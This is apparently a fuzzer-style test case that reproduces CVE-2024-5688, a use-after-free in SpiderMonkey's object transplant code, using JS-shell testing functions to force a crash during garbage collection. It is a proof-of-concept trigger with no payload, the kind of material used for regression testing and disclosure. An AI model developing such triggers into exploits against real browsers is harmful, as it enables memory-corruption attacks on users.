// CVE-2024-5688: Use-After-Free in Object Transplant
// Bug 1895086 - Wild deref in js::Shape::getObjectClass during GC sweep
// Run with: --fuzzing-safe
gczeal(8, 37);
function f67() {
    for (let i71 = 0; i71 < 50; i71++) {
        const v82 = this.transplantableObject();
        const v83 = v82.object;
        class C84 {
        }
        const o86 = {
            "sameZoneAs": C84,
            "immutablePrototype": false,
        };
        const t60 = newGlobal(o86);
        t60.__proto__ = v83;
        const v90 = newGlobal();
        v90.nukeAllCCWs();
        v82.transplant(v90);
    }
}
f67();
